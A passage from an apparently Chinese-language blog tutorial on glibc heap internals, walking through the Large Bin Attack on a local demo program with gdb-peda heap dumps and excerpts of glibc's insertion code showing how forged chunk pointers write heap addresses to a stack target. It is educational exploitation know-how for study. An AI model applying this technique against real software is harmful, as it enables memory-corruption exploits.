<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602f90 —▸ 0x602e80 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602f90<br>smallbins<br>empty<br>largebins<br>0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602430 /* &#x27;0$`&#x27; */<br>gdb-peda$ p p11<br>$3 = (unsigned long *) 0x602fa0<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/49139df9-1250-448c-b563-1de3731562ca'><img src="blob:https://tokameine.top/49139df9-1250-448c-b563-1de3731562ca"></p>
<p>        free(p11)后Bins的情况如上</p>
<h3 id="step-2-3-2-1："><a href="#step-2-3-2-1：" class="headerlink" title="step 2-3-2-1："></a>step 2-3-2-1：</h3><p>        现在，我们将代码中注释的step 2-3-2-1下两行解开，重新编译，进入第37行的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ heap<br>0x602000 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x421, <br>  fd = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, <br>  bk = 0x602870, <br>  fd_nextsize = 0x602430, <br>  bk_nextsize = 0x602430<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/4bed9106-b7ab-42d1-9d8a-75821596303f'><img src="blob:https://tokameine.top/4bed9106-b7ab-42d1-9d8a-75821596303f"></p>
<p>        我们发现，其修改了chunk p1的size，而此时的chunk p1正被挂在Large Bin 中的最后一个节点上，当我们再次malloc时候，将得到如下的Bin：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602ef0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602ef0<br>smallbins<br>empty<br>largebins<br>0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 —▸ 0x602f90 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— ...<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/f45084a5-6504-4456-8779-a7c12c46a4cf'><img src="blob:https://tokameine.top/f45084a5-6504-4456-8779-a7c12c46a4cf"></p>
<p>         我们按照顺序标记出Large Bin中四个节点的大小：0x411、0x411、0x421、0x411</p>
<p>        p11被挂到了最后，且p1也没有挂到前面去，这种现象是由于管理机制的漏洞所致：</p>
<p>        堆管理器会默认<strong>当前Index下的链表的最后一个就是最小的块</strong>，然后把要放入的块和其比较，如果比当前最小块还小，那就直接放在最后，并直接返回了</p>
<p>        因此篡改了本例种最后一个节点p1的大小，使得整个链表的<strong>“最小块”的尺寸增大</strong>，以至于出现上述现象</p>
<h3 id="step-2-3-2-2-1："><a href="#step-2-3-2-2-1：" class="headerlink" title="step 2-3-2-2-1："></a>step 2-3-2-2-1：</h3><p>        现在注释掉step 2-3-2-1并解开step 2-3-2-2-1，重新编译并运行到41行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602ef0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602ef0<br>smallbins<br>empty<br>largebins<br>0x400: 0x602430 —▸ 0x602f90 —▸ 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— ...<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/dfd7bce8-a836-4838-b001-eebffb1e5dac'><img src="blob:https://tokameine.top/dfd7bce8-a836-4838-b001-eebffb1e5dac"></p>
<p>        0x602f90 的Size也为0x411，它大于最小的块，因此将从该Index的链表头部开始往下遍历，并发现第一个节点的Size与其相同，于是直接将该节点放在第二个节点的位置，其他节点顺位往下</p>
<h3 id="step-2-3-2-2-2："><a href="#step-2-3-2-2-2：" class="headerlink" title="step 2-3-2-2-2："></a>step 2-3-2-2-2：</h3><p>        注释掉step 2-3-2-2-1并解开step 2-3-2-2-2</p>
<p>        程序在第44行篡改了第一个节点的Size，使其小于将要插入的块</p>
<p>        于是当我们检索发现要插入的块其Size大于最小块，从头开始遍历，又发现其大于第一个节点，于是就将自己作为了新的头节点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsortedbin<br>all: 0x602ef0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602ef0<br>smallbins<br>empty<br>largebins<br>0x400: 0x602f90 —▸ 0x602430 —▸ 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— ...<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e1d05761-add1-435a-882f-872c49d19840'><img src="blob:https://tokameine.top/e1d05761-add1-435a-882f-872c49d19840"></p>
<h3 id="Attack-part："><a href="#Attack-part：" class="headerlink" title="Attack part："></a>Attack part：</h3><p>        最后，我们注释掉step 2-3-2-2-2，并解开Attack part的注释重新编译并运行到第49行</p>
<p>        49至53行，代码篡改了chunk p3的内容，直接运行到54行，查看p3结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x602840 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x3f1, <br>  fd = 0x7fffffffdde0, <br>  bk = 0x7fffffffdde0, <br>  fd_nextsize = 0x7fffffffdde0, <br>  bk_nextsize = 0x7fffffffdde0<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/ec7ed315-899f-4632-bd25-a5ba30bd7219'><img src="blob:https://tokameine.top/ec7ed315-899f-4632-bd25-a5ba30bd7219"></p>
<p>         当我们再次执行malloc时候，将会在该链表头部插入新的节点</p>
<p>        此时，由于我们对原本的头部进行了数据的篡改，将导致堆地址的泄露</p>
<p>        其原理与第四章所写的Unlink攻击有些相似</p>
<p>        我们先从条件背景中摘抄出本范例在最后一个malloc时候会发生的事情：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">              else<br>              &#123;<br>                  victim-&gt;fd_nextsize = fwd;<br>                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                  fwd-&gt;bk_nextsize = victim;<br>                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>              bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>&#125;<br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/4fc50cb0-7cde-427c-b086-9ea64c81e5f8'><img src="blob:https://tokameine.top/4fc50cb0-7cde-427c-b086-9ea64c81e5f8"></p>
<ul>
<li>victim为将要插入的chunk</li>
<li>fwd为 下一个小于victim的节点</li>
<li>bck见代码第8行(将会指向Bins的表头)</li>
<li>victim_index表示victim将要放入的Bin的索引</li>
</ul>
<p>        本例中，victim为 chunk p11，fwd将为chunk p3，bck则为&amp;stack</p>
<p>        在第6行处，将在(&amp;stack+4)处写入victim的堆地址</p>
<p>        在最后一行，将在(&amp;stack+2)处写入victim的堆地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p &amp;stack<br>$5 = (unsigned long (*)[8]) 0x7fffffffdde0<br>gdb-peda$ x /10gx 0x7fffffffdde0<br>0x7fffffffdde0:0x00000000000000000x0000000000000000<br>0x7fffffffddf0:0x00000000006033a00x0000000000000000<br>0x7fffffffde00:0x00000000006033a00x0000000000000000<br>0x7fffffffde10:0x00000000000000000x0000000000000000<br>0x7fffffffde20:0x00007fffffffdf100x131d22806a239e00<br></code></pre></td></tr></table></figure>

<p>         Large Bin Attack至此成功 ​</p>
<p>插画ID：91443910</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/07/glibc-6/">← 下一篇 关于如何理解Glibc堆管理器(Ⅵ——从House of Orange理解Heap是如何被拓展的)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/07/glibc-4/">关于如何理解Glibc堆管理器(Ⅳ——从Unlink攻击理解指针与chunk寻址方式) 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">参考文章：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%83%8C%E6%99%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">条件背景：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">前置知识：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-Bin-Attack%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">Unsorted Bin Attack：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">5.</span> <span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8C%83%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-howtoheap2%E2%80%94%E2%80%94unsorted-bin-attack"><span class="toc-number">5.1.</span> <span class="toc-text">范例代码：(howtoheap2——unsorted_bin_attack)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="toc-number">5.2.</span> <span class="toc-text">代码调试：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Large-Bin-Attack%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">Large Bin Attack：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8C%83%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">范例代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%EF%BC%9A-1"><span class="toc-number">6.2.</span> <span class="toc-text">代码调试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-3-2-1%EF%BC%9A"><span class="toc-number">6.3.</span> <span class="toc-text">step 2-3-2-1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-3-2-2-1%EF%BC%9A"><span class="toc-number">6.4.</span> <span class="toc-text">step 2-3-2-2-1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-3-2-2-2%EF%BC%9A"><span class="toc-number">6.5.</span> <span class="toc-text">step 2-3-2-2-2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-part%EF%BC%9A"><span class="toc-number">6.6.</span> <span class="toc-text">Attack part：</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>